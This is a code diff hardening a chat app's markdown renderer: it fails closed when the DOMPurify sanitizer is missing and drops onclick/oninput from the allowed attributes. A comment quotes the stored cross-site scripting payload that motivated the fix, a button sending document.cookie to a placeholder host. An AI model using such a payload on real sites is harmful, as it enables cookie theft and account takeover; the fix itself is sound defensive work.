@@ -850,6 +850,19 @@ document.addEventListener("DOMContentLoaded", () => {
         const _marked = window.marked;
         const _DOMPurify = window.DOMPurify;
 
+        // Fail CLOSED. This used to fall through and return unsanitized HTML when
+        // DOMPurify was missing, which is not a theoretical branch for a K-12
+        // product: district content filters routinely block CDN hosts, and a
+        // blocked sanitizer meant every message rendered raw. DOMPurify is now
+        // vendored locally (see public/vendor/dompurify), so absence means
+        // something is genuinely broken — render as text rather than as markup.
+        if (!_DOMPurify) {
+            console.error('[renderMarkdownMath] DOMPurify unavailable — rendering as plain text');
+            const _esc = document.createElement('div');
+            _esc.textContent = text;
+            return _esc.innerHTML;
+        }
+
         // Protect LaTeX from markdown using the shared delimiter scanner.
         // It auto-closes a stray/unbalanced delimiter at the next paragraph
         // break, so one missing `\]` can never swallow an entire explanation
@@ -954,8 +967,17 @@ document.addEventListener("DOMContentLoaded", () => {
                     'x', 'y', 'x1', 'y1', 'x2', 'y2', 'cx', 'cy', 'r', 'rx', 'ry', 'd', 'points',
                     'text-anchor', 'font-size', 'font-weight', 'transform', 'transform-origin',
                     'offset', 'stroke-linecap', 'stroke-linejoin', 'opacity',
-                    // Form/interactive attributes
-                    'type', 'min', 'max', 'value', 'step', 'oninput', 'onclick',
+                    // Form/interactive attributes.
+                    // NEVER add on* event-handler attributes here. DOMPurify does not
+                    // special-case them: whitelisting 'onclick' whitelists arbitrary
+                    // JavaScript, and its URI check passes values like "alert(1)". With
+                    // 'oninput'/'onclick' present, a student typing
+                    //   <button onclick="fetch('//x/?c='+document.cookie)">solve</button>
+                    // into the chat box got it back verbatim, stored, and re-fired on
+                    // every conversation reload. Interactive visuals do not need these —
+                    // inlineChatVisuals.initializeVisuals() binds every handler with
+                    // addEventListener after insertion.
+                    'type', 'min', 'max', 'value', 'step',
                     // Data attributes for visuals
                     'data-config', 'data-diagram-id', 'data-value', 'data-label',
                     // KaTeX attributes
